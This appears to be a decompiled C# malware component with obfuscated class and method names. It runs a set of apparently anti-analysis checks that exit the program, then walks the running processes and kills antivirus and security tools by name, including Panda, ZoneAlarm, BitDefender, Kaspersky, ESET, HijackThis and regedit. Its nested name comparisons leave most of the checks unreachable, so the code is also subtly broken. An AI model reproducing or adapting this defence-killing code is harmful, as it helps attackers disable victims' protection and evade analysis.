#define DEBUG
using System.Diagnostics;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using ns4;

namespace ns2;

internal sealed class Class10
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		if (Class17.smethod_0())
		{
			ProjectData.EndApp();
		}
		if (Class17.smethod_1())
		{
			ProjectData.EndApp();
		}
		if (Class17.smethod_2())
		{
			ProjectData.EndApp();
		}
		if (Class17.smethod_3())
		{
			ProjectData.EndApp();
		}
		if (Class17.smethod_4())
		{
			ProjectData.EndApp();
		}
		if (Class17.smethod_5())
		{
			ProjectData.EndApp();
		}
		Process[] processes = Process.GetProcesses();
		checked
		{
			int num = processes.Length - 1;
			int num2 = 0;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				Debug.WriteLine(processes[num2].ProcessName);
				if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("PandaAVEngine.exe"), false) == 0)
				{
					processes[num2].Kill();
					if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("zonealarm.exe"), false) == 0)
					{
						processes[num2].Kill();
						if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("msblast.exe"), false) == 0)
						{
							processes[num2].Kill();
							if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("regedit.exe"), false) == 0)
							{
								processes[num2].Kill();
								if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("av"), false) == 0)
								{
									processes[num2].Kill();
									if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("hijackthis"), false) == 0)
									{
										processes[num2].Kill();
										if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("sample"), false) == 0)
										{
											processes[num2].Kill();
											if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("outpost"), false) == 0)
											{
												processes[num2].Kill();
												if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("npfmsg"), false) == 0)
												{
													processes[num2].Kill();
													if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("bdagent"), false) == 0)
													{
														processes[num2].Kill();
														if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("kavsvc"), false) == 0)
														{
															processes[num2].Kill();
															if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("egui"), false) == 0)
															{
																processes[num2].Kill();
																if (Operators.CompareString(Strings.UCase(processes[num2].ProcessName), Strings.UCase("zlclient"), false) == 0)
																{
																	processes[num2].Kill();
																}
															}
														}
													}
												}
											}
										}
									}
								}
							}
						}
					}
				}
				num2++;
			}
		}
	}
}
